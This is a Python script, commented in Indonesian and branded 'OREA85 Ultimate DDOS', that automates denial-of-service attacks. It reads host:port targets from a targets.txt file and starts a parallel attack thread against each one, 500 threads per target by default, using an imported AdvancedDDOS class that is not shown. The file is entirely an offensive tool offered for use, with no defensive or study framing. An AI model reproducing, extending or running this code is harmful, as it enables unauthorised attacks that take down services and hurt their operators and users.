#!/usr/bin/env python3
"""
OREA85 Ultimate DDOS - Automated Version
Script untuk menjalankan serangan DDOS otomatis ke multiple targets
Created by OREA85
"""

import time
import subprocess
import threading
from advanced_ddos import AdvancedDDOS

def run_attack(target, port, threads):
    """Menjalankan serangan ke target tertentu"""
    print(f"🚀 Menyerang {target}:{port} dengan {threads} threads")
    
    ddos = AdvancedDDOS(target, port, threads)
    ddos.start_attack()

def main():
    print("=" * 60)
    print("🎯 OREA85 ULTIMATE DDOS - AUTOMATED VERSION")
    print("=" * 60)
    print("💎 Created by OREA85")
    print("=" * 60)
    
    # Baca target dari file
    targets = []
    try:
        with open('targets.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) >= 2:
                        target = parts[0]
                        port = int(parts[1])
                        description = parts[2] if len(parts) > 2 else "Unknown"
                        targets.append((target, port, description))
    except FileNotFoundError:
        print("❌ File targets.txt tidak ditemukan!")
        return
    
    if not targets:
        print("❌ Tidak ada target yang ditemukan!")
        return
    
    print(f"📋 Ditemukan {len(targets)} target:")
    for i, (target, port, description) in enumerate(targets, 1):
        print(f"  {i}. {target}:{port} - {description}")
    
    # Konfigurasi
    threads_per_target = int(input("⚡ Threads per target (default 500): ") or "500")
    
    print(f"\n🔥 Memulai serangan ke {len(targets)} target...")
    print("⚠️  Tekan CTRL+C untuk berhenti")
    
    # Jalankan serangan secara paralel
    threads = []
    for target, port, description in targets:
        thread = threading.Thread(target=run_attack, args=(target, port, threads_per_target))
        thread.start()
        threads.append(thread)
        time.sleep(1)  # Delay antar target
    
    # Tunggu semua thread selesai
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\n✅ Semua serangan dihentikan")

if __name__ == "__main__":
    main()